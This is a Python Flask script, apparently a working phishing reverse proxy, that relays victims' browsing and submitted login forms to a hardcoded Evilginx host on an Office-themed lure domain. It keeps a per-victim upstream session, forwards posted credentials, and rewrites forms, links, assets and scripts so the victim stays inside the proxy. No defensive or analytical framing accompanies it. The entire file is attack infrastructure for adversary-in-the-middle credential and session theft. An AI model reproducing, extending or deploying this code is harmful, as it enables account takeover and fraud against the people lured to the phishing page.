import uuid
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, session, Response
import re

app = Flask(__name__)
app.secret_key = 'YOUR_SECRET_KEY'
EVILGINX_HOST = "https://office.aqvfjfufcy.beconinc.org"
evil_sessions = {}

@app.route('/CJJlHmAY', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/CJJlHmAY/<path:subpath>', methods=['GET', 'POST'])
def phishing_proxy(subpath):
    client_id = session.get('client_id')
    if not client_id:
        client_id = str(uuid.uuid4())
        session['client_id'] = client_id
    if client_id not in evil_sessions:
        evil_sessions[client_id] = requests.Session()
    sess = evil_sessions[client_id]

    if request.method == 'POST':
        target_path = request.form.get('targetPath', '')
    else:
        target_path = '/' + subpath if subpath else '/CJJlHmAY'
    target_url = EVILGINX_HOST + target_path

    if request.method == 'GET':
        upstream_resp = sess.get(target_url, allow_redirects=False)
    else:
        form_data = request.form.to_dict()
        form_data.pop('targetPath', None)
        upstream_resp = sess.post(target_url, data=form_data, allow_redirects=False)

    redirect_limit = 5
    while upstream_resp.is_redirect and redirect_limit > 0:
        loc = upstream_resp.headers.get('Location')
        if not loc:
            break
        next_url = loc if loc.startswith('http') else EVILGINX_HOST + loc
        upstream_resp = sess.get(next_url, allow_redirects=False)
        redirect_limit -= 1

    content_type = upstream_resp.headers.get('Content-Type', '')
    if not content_type or "text/html" not in content_type.lower():
        excluded_h = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        headers = [(h, v) for h, v in upstream_resp.headers.items() if h.lower() not in excluded_h]
        return Response(upstream_resp.content, status=upstream_resp.status_code, headers=headers)

    html = upstream_resp.text
    soup = BeautifulSoup(html, 'html.parser')

    base_tag = soup.new_tag('base', href=request.host_url + 'CJJlHmAY/')
    soup.head.insert(0, base_tag)

    for form in soup.find_all('form'):
        orig_action = form.get('action', '')
        form['action'] = ''
        if orig_action:
            hidden = soup.new_tag('input', type='hidden', name='targetPath', value=orig_action)
            form.insert(0, hidden)

    for a in soup.find_all('a', href=True):
        href = a['href']
        if href.startswith(('javascript:', '#')):
            continue
        if href.startswith('http'):
            if EVILGINX_HOST in href:
                href = href.replace(EVILGINX_HOST, '')
            else:
                a['target'] = '_blank'
                continue
        if not href.startswith('/'):
            href = '/' + href
        a['data-path'] = href
        a['href'] = '#'

    for tag, attr in [('img', 'src'), ('script', 'src'), ('link', 'href')]:
        for node in soup.find_all(tag, **{attr: True}):
            url = node.get(attr)
            if url.startswith(('javascript:', 'data:')) or url == '':
                continue
            if url.startswith('http'):
                if EVILGINX_HOST in url:
                    url = url.replace(EVILGINX_HOST, '')
                else:
                    continue
            if not url.startswith('/'):
                url = '/' + url
            node[attr] = '/CJJlHmAY' + url

    # 🔥 Rewrite inline JS URLs inside <script> tags
    for script in soup.find_all('script'):
        if script.string:
            fixed_js = re.sub(
                r'(?<!["\'])/common/',
                '/CJJlHmAY/common/',
                script.string
            )
            script.string.replace_with(fixed_js)

    # Inject JS to handle internal navigation
    nav_script = """
    <script>
    function fetchPage(path) {
      fetch('/CJJlHmAY' + path, { credentials: 'same-origin' })
        .then(res => res.text())
        .then(html => {
          document.open();
          document.write(html);
          document.close();
        });
    }
    document.addEventListener('click', function(e) {
      const el = e.target;
      if (el.tagName === 'A' && el.dataset.path) {
        e.preventDefault();
        fetchPage(el.dataset.path);
      }
    });
    </script>
    """
    soup.body.append(BeautifulSoup(nav_script, 'html.parser'))

    return str(soup)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
